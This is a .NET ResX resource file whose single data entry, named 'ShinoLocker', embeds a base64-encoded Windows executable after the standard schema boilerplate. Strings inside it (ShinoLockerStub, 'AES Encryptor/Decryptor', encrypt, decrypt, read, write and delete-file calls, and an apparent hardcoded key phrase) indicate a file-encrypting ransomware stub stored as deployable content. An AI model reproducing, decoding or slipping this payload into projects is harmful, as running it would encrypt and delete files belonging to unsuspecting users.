<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="mscorlib" name="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="ShinoLocker" type="System.Byte[], mscorlib">
    <value>
        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
        AAAAAMYCMgF6AQ4AfSYAAAAAgwC3ASsCDgCJJgAAAADGAu0EWgAOAJQmAAAAABEAkAAxAg4AtCYAAAAA
        AQB8ADkCDwC9JgAAAAAGGFQHBgAQAMUmAAAAAAMICQFVARAAvSYAAAAABhhUBwYAEAAAAAEA3wkAAAIA
        wQkAAAMA9gQAAAQA5gUAAAEArwAAAAIA3wkAAAMAwQkAAAEArwAAAAIA3wkAAAMAwQkAAAEAvwkAAAEA
        kgQAAAEAKgYAAAEAKQEAAAEAKQEJAFQHAQARAFQHBgAZAFQHCgApAFQHEAAxAFQHEAA5AFQHEABBAFQH
        EABJAFQHEABRAFQHEABZAFQHFQBhAFQHEABpAFQHEABxAFQHBgCBAFQHBgCZAFQHGgChAFQHBgCpAFQH
        BgCxAFQHBgDRAFQHIADhAFQHEAD5AFQHBgAJAVQHJgAZAVQHBgAhARsJQwApASkFSAAxAeAITgA5Ac4E
        VABBAd0GWgBJAd8EXgBBAfIAZQAxAe0IawAxAZoBcwBBAWoJfgAhAYgJhABhAToHiQCJAF4BWgBpAa0B
        jwBhASgHlABxAZkJngB5AWMJowCBAVQHBgCJAagEAQCBAbYEAQCJAXUAswCBAdcJswCJAT4BuQCJAcIE
        wACBAXEHxwCRAP8EzAChASICBgCBAWEHxwCpAfIA4gCpASQH7gC5Ae0E8wCpAYEH+ACpAUsFAQGpAYIJ
        BgGpAW0FEQFxAcQJFgE5ASQAGwGpAeAAIQF5AC4JKAERAYgBLgERAQAKNwG5AFQHPQHRAdMARQHZAFQH
        BgDpAFQHBgDxAFQHBgAMAAkBVQEUAAkBVQEcAAkBVQEkAAkBVQEMAFQHBgAUAFQHBgAcAFQHBgAkAFQH
        BgDZAYkEcAF5ADcJdQF5ADIBegF5AO0EWgDhAfoAhgF5AFQHBgA0AHUEmAEIAAQAtgEIAAgAtgEpAJsA
        kgIuAAsAagIuABMAcwIuABsAkgIuACMAmwIuACsAsAIuADMAzQIuADsAmwIuAEMA2gIuAEsAmwIuAFMA
        +QIuAFsA/wIuAGMAKQNAAHMANgNDAGsANgNJAJsAkgJjAGsANgNjAHsARANjAIMANgNjAIsANgNjAJMA
        NgODAIsANgODAHsAhQODAJsAkgKJAKMAWgSjAGsANgOjAJMANgOjAIMANgOjAIsANgOpAKMAawTDAHsA
        3wPDAJsAOwPJAKMAfATjAHsA3wPjAJsAOwPpAKMAkAQDAWsANgMDAZMANgMDAXsA3wMJAaMAnQQjAZsA
        OwMjAbMA+ANDAZsAOwNDAVMA+QJhAYsANgNhAbsANgPgAasANgPgAZsAOwMAAqsANgMgAqsANgNAAqsA
        NgNgAqsANgOgApsAOwOgAqsANgPAApsAOwPAAqsANgPgApsAOwPgAqsANgMAA5sAOwMAA6sANgMgA6sA
        NgNAA6sANgNgA6sANgNgA5sAOwOAA6sANgOgA6sANgOgA5sAOwMuAJgAqADVAH4BAwABAAQAAwAFAAQA
        CAAFAAoACQAAAKkGQQIAAOsBRgIAAJEJSwIAABIJSwIAABsHUAIAALAFVQIAAOkGWgIAAMoHYAIAAA0B
        ZQICAAcAAwACAAgABQABAAkABQACAAwABwACAA0ACQACABAACwACABEADQACABIADwACABMAEQACABwA
        EwBOAVoBYQFpAYMBkQGcAQSAAAABAAAAAAAAAAAAAAAAALkGAAACAAAAAAAAAAAAAACkAbQAAAAAAAgA
        AAAAAAAAAAAAAK0BvQAAAAAAAgAAAAAAAAAAAAAApAExBQAAAAADAAUAAAAAAAAAAACkAb8BAAAAAAAA
        AAABAAAAsQgAAAkACAAKAAgAAAAQABQAcwAAABAAMwBzAAAAAAA1AHMApQCMAaUAnwEAAABUaHJlYWRT
        YWZlT2JqZWN0UHJvdmlkZXJgMQBNb2R1bGUxAFRvSW50NjQAPE1vZHVsZT4AREMAQkxPQ0tTSVpFAEtF
        WVNJWkUAU3lzdGVtLklPAE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5GaWxlSU8ARVhUAHNldF9JVgBEaXNw
        b3NlX19JbnN0YW5jZV9fAENyZWF0ZV9fSW5zdGFuY2VfXwBQcm9qZWN0RGF0YQBkYXRhAG1zY29ybGli
        AE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBTeW5jaHJvbml6ZWQATWlkAENvbXBhcmVNZXRob2QAUmVwbGFj
        ZQBDcmVhdGVJbnN0YW5jZQBnZXRfR2V0SW5zdGFuY2UAZGVmYXVsdEluc3RhbmNlAGluc3RhbmNlAEdl
        dEhhc2hDb2RlAHNldF9Nb2RlAFBhZGRpbmdNb2RlAENpcGhlck1vZGUAZ2V0X01lc3NhZ2UASURpc3Bv
        c2FibGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUARGVsZXRlRmlsZQBDb25zb2xl
        AFdyaXRlTGluZQBHZXRUeXBlAFN5c3RlbS5Db3JlAGdldF9DdWx0dXJlAHNldF9DdWx0dXJlAHJlc291
        cmNlQ3VsdHVyZQBDb25zb2xlQXBwbGljYXRpb25CYXNlAEFwcGxpY2F0aW9uU2V0dGluZ3NCYXNlAERp
        c3Bvc2UARWRpdG9yQnJvd3NhYmxlU3RhdGUAVGhyZWFkU3RhdGljQXR0cmlidXRlAFNUQVRocmVhZEF0
        dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEhlbHBLZXl3b3Jk
        QXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0
        ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEVkaXRvckJyb3dzYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0
        cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAU3RhbmRhcmRNb2R1bGVBdHRyaWJ1dGUASGlkZU1v
        ZHVsZU5hbWVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUARGVidWdnZXJIaWRkZW5B
        dHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBNeUdyb3VwQ29sbGVjdGlvbkF0dHJp
        YnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRy
        aWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFz
        c2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBtX1RocmVh
        ZFN0YXRpY1ZhbHVlAEdldE9iamVjdFZhbHVlAFNoaW5vTG9ja2VyLmV4ZQBzZXRfQmxvY2tTaXplAHNl
        dF9LZXlTaXplAHNldF9QYWRkaW5nAEZyb21CYXNlNjRTdHJpbmcAQ29tcGFyZVN0cmluZwBUb1N0cmlu
        ZwBmaWxlcGF0aABUcmFuc2Zvcm1GaW5hbEJsb2NrAFN5c3RlbS5Db21wb25lbnRNb2RlbABnZXRfRmls
        ZVN5c3RlbQBTeW1tZXRyaWNBbGdvcml0aG0AVHJpbQBJQ3J5cHRvVHJhbnNmb3JtAHJlc291cmNlTWFu
        AExlbgBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduAE1haW4AQ29udmVyc2lvbgBnZXRfQXBwbGlj
        YXRpb24ATXlBcHBsaWNhdGlvbgBTeXN0ZW0uQ29uZmlndXJhdGlvbgBTeXN0ZW0uR2xvYmFsaXphdGlv
        bgBhY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24AVUlPcHRpb24AUmVjeWNsZU9wdGlvbgBFeGNlcHRpb24A
        Q3VsdHVyZUluZm8AQWVzQ3J5cHRvU2VydmljZVByb3ZpZGVyAG1fQXBwT2JqZWN0UHJvdmlkZXIAbV9V
        c2VyT2JqZWN0UHJvdmlkZXIAbV9Db21wdXRlck9iamVjdFByb3ZpZGVyAG1fTXlXZWJTZXJ2aWNlc09i
        amVjdFByb3ZpZGVyAGdldF9SZXNvdXJjZU1hbmFnZXIAU2hpbm9Mb2NrZXIAU3lzdGVtLkNvZGVEb20u
        Q29tcGlsZXIAVG9VcHBlcgBnZXRfVXNlcgBDaGVja1BhcmFtZXRlcgBnZXRfQ29tcHV0ZXIAU2VydmVy
        Q29tcHV0ZXIATXlDb21wdXRlcgBDaHIAQ2xlYXJQcm9qZWN0RXJyb3IAU2V0UHJvamVjdEVycm9yAEFj
        dGl2YXRvcgAuY3RvcgAuY2N0b3IAQ3JlYXRlRGVjcnlwdG9yAENyZWF0ZUVuY3J5cHRvcgBJblN0cgBT
        eXN0ZW0uRGlhZ25vc3RpY3MATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZXMAZ2V0X1dlYlNlcnZp
        Y2VzAE15V2ViU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkFwcGxpY2F0aW9uU2VydmljZXMA
        U3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21waWxl
        clNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJh
        c2ljLk15U2VydmljZXMAU3lzdGVtLlJlc291cmNlcwBTaGlub0xvY2tlci5NeS5SZXNvdXJjZXMAU2hp
        bm9Mb2NrZXIuUmVzb3VyY2VzLnJlc291cmNlcwBEZWJ1Z2dpbmdNb2RlcwBSZWFkQWxsQnl0ZXMAV3Jp
        dGVBbGxCeXRlcwBTdHJpbmdzAGdldF9TZXR0aW5ncwBNeVNldHRpbmdzAEdldENvbW1hbmRMaW5lQXJn
        cwBSZWZlcmVuY2VFcXVhbHMAQ29udmVyc2lvbnMAUnVudGltZUhlbHBlcnMAT3BlcmF0b3JzAEV4aXN0
        cwBDb25jYXQAT2JqZWN0AE15UHJvamVjdABTcGxpdABFeGl0AGdldF9EZWZhdWx0AEludABFbnZpcm9u
        bWVudABEZWNyeXB0AEVuY3J5cHQAQ29udmVydABpdgBIZXgAU2hpbm9Mb2NrZXIuTXkAc2V0X0tleQBr
        ZXkAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeQBnZXRfQXNzZW1ibHkATXlTZXR0aW5nc1Byb3Bl
        cnR5AEZpbGVTeXN0ZW1Qcm94eQAAgRlzAHkAbgBjACAAbwB2AGUAcgBjAG8AbQBwAGUAbgBzAGEAdABp
        AG8AbgAgAGgAbwBuAGUAeQBiAHUAbgBzACAAZgBsAHUAZQBzACAAYwBvAG0AZgBpAGUAcwB0ACAAcABl
        AHIAcwB1AGEAZABpAG4AZwAgAHUAbgByAGUAYQBzAG8AbgAgAGMAbwBuAHYAZQByAGcAZQBuAGMAZQAg
        AG4AYQBpAGwAaABlAGEAZAAgAGMAaQBuAGUAbQBhAHQAbwBnAHIAYQBwAGgAaQBlAHMAIAByAGEAaQBt
        AGUAbgB0AHMAIABhAHUAdABoAG8AcgBpAHQAYQByAGkAYQBuAGkAcwBtAHMAIAByAG8AbwBtAC4AIAB2
        AGMAAANEAAABAANFAAARRQBSAFIATwBSADoAIAAgAAAPRQBSAFIATwBSADoAIAAAAwkAAAMgAAADDQAA
        AwoAAAUgACAAACtTAGgAaQBuAG8ATABvAGMAawBlAHIALgBSAGUAcwBvAHUAcgBjAGUAcwAAAABFvy9d
        mTShT5FMfgBeWWc+AAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFIAIBDg4FIAEBEWUHIAQBDg4ODhQH
        Cx0ODg4ODh0FHQUdBR0FHQUSRQQAAB0OBSAAEoCZBSABHQUOBQABHQUOAyAADgYAAwgODgIFIAIODg4H
        IAMBDh0FAgogAwEOEYCpEYCtBQACDg4OBAABAQgFAAEBEkUEAAEBDgMAAAEFBwICEkUEAAENDQQAAQIO
        CgcEHQUdBRJJEkUFIAEBHQUGIAEBEYDJBiABARGAzQQgABJJCCADHQUdBQgIDAcJDh0ODggICAgICAsA
        Bg4ODg4ICBGA2QQAAQMIBAABDgMIAAMIDg4RgNkEAAEODgoABB0ODg4IEYDZBAABCA4EAAEOCAUAAgoO
        CAYAAw4OCAgFAAICHBwIAAESgIkRgOEFIAASgOUHIAIBDhKA5QgAARKA6RKA6QYVEigBEhwEIAATAAYV
        EigBEhgHFRIoARKAgQYVEigBEiQEAAEcHAQgAQIcAyAACAQHAR4AAh4ABRABAB4ABAoBHgAGFRIoARMA
        AwYTAAITAAQKARMACLd6XFYZNOCJCLA/X38R1Qo6BIAAAAACBggCBg4DBhJdAwYSYQMGEhAHBhUSKAES
        HAcGFRIoARIYCAYVEigBEoCBBwYVEigBEiQHAAQCDg4ODgoAAx0FHQUdBR0FBAAAEl0EAAASYQUAAQES
        YQQAABIQBAAAEhwEAAASGAUAABKAgQQAABIkBSAAEoCJBxABAR4AHgAHMAEBARAeAAQIABJdBAgAEmEE
        CAASEAQIABIcBAgAEhgFCAASgIEECAASJAQoABMACAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0
        aW9uVGhyb3dzAQgBAAIAAAAAABQBAA9TaGlub0xvY2tlclN0dWIAABwBABdBRVMgRW5jcnlwdG9yL0Rl
        Y3J5cHRvcgAADAEAB1NoMW4wZzEAAB4BABlDb3B5cmlnaHQgwqkgU2hpbm9TZWMgSW5jAAAFAQAAAAAp
        AQAkNzc0M2U1MDMtOWMxYi00YTc2LTg0YmQtMzBhZTRjNGVhNTVjAAAMAQAHMS4wLjAuMAAABAEAAAAI
        AQABAAAAAABAAQAzU3lzdGVtLlJlc291cmNlcy5Ub29scy5TdHJvbmdseVR5cGVkUmVzb3VyY2VCdWls
        ZGVyBzQuMC4wLjAAAFkBAEtNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLkVkaXRvcnMuU2V0dGluZ3NEZXNp
        Z25lci5TZXR0aW5nc1NpbmdsZUZpbGVHZW5lcmF0b3IIMTQuMC4wLjAAABgBAApNeVRlbXBsYXRlCDEx
        LjAuMC4wAABhAQA0U3lzdGVtLldlYi5TZXJ2aWNlcy5Qcm90b2NvbHMuU29hcEh0dHBDbGllbnRQcm90
        b2NvbBJDcmVhdGVfX0luc3RhbmNlX18TRGlzcG9zZV9fSW5zdGFuY2VfXwAAABABAAtNeS5TZXR0aW5n
        cwAAEAEAC015LkNvbXB1dGVyAAATAQAOTXkuQXBwbGljYXRpb24AAAwBAAdNeS5Vc2VyAAATAQAOTXku
        V2ViU2VydmljZXMAAAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5SZXNvdXJjZVJl
        YWRlciwgbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU
        b2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3RlbS5SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAA
        AAAAAAAAAAAAUEFEUEFEULQAAAAYQgAAAAAAAAAAAAAyQgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        JEIAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
